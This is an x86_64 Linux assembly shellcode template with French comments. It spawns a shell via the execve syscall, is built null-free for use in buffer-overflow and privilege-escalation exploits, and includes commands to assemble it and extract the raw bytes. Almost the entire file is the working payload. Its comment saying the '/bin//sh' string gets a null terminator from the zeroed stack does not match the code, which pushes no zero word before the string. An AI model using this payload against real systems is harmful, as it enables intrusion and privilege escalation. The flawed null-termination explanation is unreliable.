; =============================================================================
; execve_binsh.s — Shellcode template x86_64 Linux
; =============================================================================
; Description : Spawn un shell local via execve("/bin//sh", NULL, NULL).
;               C'est le shellcode classique utilisé en exploitation locale
;               (buffer overflow, privilege escalation...).
;
; Syscall     : execve (59)
; Taille      : ~27 bytes
; Null bytes  : aucun  ("/bin//sh" = 8 chars, pas de null dans la string,
;               le null terminateur est obtenu via xor rdx + push)
;
; Astuce null-free :
;   - On utilise "/bin//sh" au lieu de "/bin/sh" (double slash ignoré)
;     pour avoir exactement 8 bytes → tient dans un registre 64 bits.
;   - push rbx pousse la string + un null byte implicite (le bas de la stack
;     était xor'd donc = 0).
;
; Compilation :
;   nasm -f elf64 execve_binsh.s -o execve_binsh.o
;   ld execve_binsh.o -o execve_binsh
;   objcopy --dump-section .text=execve_binsh.bin execve_binsh
;
; Ou via build.sh fourni dans ce dossier.
; =============================================================================

section .text
global _start

_start:
    ; --- Préparer envp = NULL et argv = NULL ---
    xor rdx, rdx                        ; rdx = NULL  (envp)
    xor rsi, rsi                        ; rsi = NULL  (argv)

    ; --- Empiler "/bin//sh\0" sur la stack ---
    ; "/bin//sh" en ASCII little-endian (lu de droite à gauche) :
    ;   h  s  /  /  n  i  b  /
    ;   68 73 2f 2f 6e 69 62 2f
    ;   → 0x68732f2f6e69622f
    mov rbx, 0x68732f2f6e69622f         ; rbx = "/bin//sh"
    push rbx                            ; empile sur la stack
                                        ; (la stack était alignée, les bytes
                                        ;  en dessous valent 0 → null terminator)

    ; --- rdi = pointeur vers "/bin//sh" ---
    mov rdi, rsp                        ; rdi = adresse du string sur la stack

    ; --- execve(rdi, NULL, NULL) ---
    push 59                             ; numéro syscall execve = 59
    pop rax                             ; rax = 59 (sans null bytes)
    syscall
